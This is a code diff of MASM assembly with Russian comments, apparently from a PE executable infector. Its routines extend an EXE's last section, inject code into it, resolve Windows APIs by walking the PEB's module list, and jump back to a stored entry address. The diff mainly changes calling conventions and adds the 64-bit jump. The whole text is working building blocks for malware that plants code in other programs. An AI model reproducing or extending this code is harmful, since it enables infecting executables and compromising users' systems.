@@ -111,11 +111,12 @@ endm
 
 
 
-FindProcAddressByName proto CurrentStdcallNotation :ptr byte
-FindProcAddress proto CurrentStdcallNotation :ptr byte, :ptr byte
-FindProcArray proto CurrentStdcallNotation :ptr byte, :ptr byte, :cword
+FindProcAddressByName proto stdcall :ptr byte
+FindProcAddress proto stdcall :ptr byte, :ptr byte
+FindProcArray proto stdcall :ptr byte, :ptr byte, :cword
+
 InjectEXE proto CurrentStdcallNotation
-InjectLastSection proto CurrentStdcallNotation :cword, :cword, :cword
+InjectLastSection proto stdcall :cword, :cword, :cword
 ExtendLastSection proto CurrentStdcallNotation :cword, :cword, :cword, :cword
 LoadPeFile proto CurrentStdcallNotation :ptr byte, :ptr byte, :cword
 UnloadPeFile proto CurrentStdcallNotation :cword
@@ -196,7 +197,8 @@ local 	oldProtect:cword
     
 ifdef _WIN64
 	; code for 64
-	
+	mov cax, [cbx - 4]
+	jmp cax
 else
 	; code for 32
 	mov eax, [cbx - 4]
@@ -252,19 +254,12 @@ InjectEXE proc CurrentStdcallNotation
     ret
 InjectEXE endp
 
-InjectLastSection proc CurrentStdcallNotation pe:cword, code:cword, codeSize:cword
+InjectLastSection proc stdcall pe:cword, code:cword, codeSize:cword
 	local dst:cword
 	local src:cword
 	local rawNewData:cword
 	local rvaNewData:cword
 	local entryOffset:cword
-	
-	ifdef _WIN64
-		mov [rbp + 10h], rcx
-		mov [rbp + 18h], rdx
-		mov [rbp + 20h], r8
-		mov [rbp + 28h], r9
-	endif
 	
 	mov cax, [pe]
 	mov cax, [cax].PeParser.doshead
@@ -295,7 +290,6 @@ InjectLastSection proc CurrentStdcallNotation pe:cword, code:cword, codeSize:cwo
 	; Расширяем последнюю секцию и получаем ее виртуальный адрес и файловое смещение
     ; ExtendLastSection (pe, codeSize, &rvaNewData, &rawNewData);
 	invoke ExtendLastSection, [pe], [codeSize], addr [rvaNewData], addr [rawNewData]
-	
 	
 	mov cax, [pe]
 	mov cdx, [cax].PeParser.mem
@@ -497,17 +491,17 @@ ExtendLastSection endp
 ; переданы в первом аргументе funcNames.
 ; Адреса сохраняются по соответствующим индексам в массиве funcAddress.
 ; void FindProcArray (in char **funcNames, out void **funcAddress, int funcCount);
-FindProcArray proc CurrentStdcallNotation uses cdi funcNames:ptr byte, funcAddress:ptr byte, funcCount:cword
+FindProcArray proc stdcall uses cdi funcNames:ptr byte, funcAddress:ptr byte, funcCount:cword
 
 local i:cword
 local funcName:cword
     
-ifdef _WIN64
-	mov [rbp + 10h], rcx
-	mov [rbp + 18h], rdx
-	mov [rbp + 20h], r8
-	mov [rbp + 28h], r9
-endif
+;ifdef _WIN64
+;	mov [rbp + 10h], rcx
+;	mov [rbp + 18h], rdx
+;	mov [rbp + 20h], r8
+;	mov [rbp + 28h], r9
+;endif
 	
     mov [i], 0
 
@@ -564,14 +558,14 @@ ret_true:
 ; Осуществляет поиск функции по имени во всех загруженных библиотеках из PEB'а.
 ; void * FindProcAddressByName (char * procName);
 ;
-FindProcAddressByName proc CurrentStdcallNotation uses cdi cbx procName:ptr byte
+FindProcAddressByName proc stdcall uses cdi cbx procName:ptr byte
 
-	ifdef _WIN64
-		mov [rbp + 10h], rcx
-		mov [rbp + 18h], rdx
-		mov [rbp + 20h], r8
-		mov [rbp + 28h], r9
-	endif
+	;ifdef _WIN64
+	;	mov [rbp + 10h], rcx
+	;	mov [rbp + 18h], rdx
+	;	mov [rbp + 20h], r8
+	;	mov [rbp + 28h], r9
+	;endif
 
     assume cur_seg_reg:nothing
     mov cbx, [cur_seg_reg:OFFSET_PEB]       ; cbx = ptr _PEB
@@ -601,7 +595,7 @@ FindProcAddressByName endp
 ; Осуществляет поиск адреса функции по ее имени в таблице экспорта
 ; void *FindProcAddress (void *baseLib, char *procName)
 ;
-FindProcAddress proc CurrentStdcallNotation uses cdi csi cbx baseLib:ptr byte, procName:ptr byte
+FindProcAddress proc stdcall uses cdi csi cbx baseLib:ptr byte, procName:ptr byte
 
 local functionsArray:cword
 local namesArray:cword
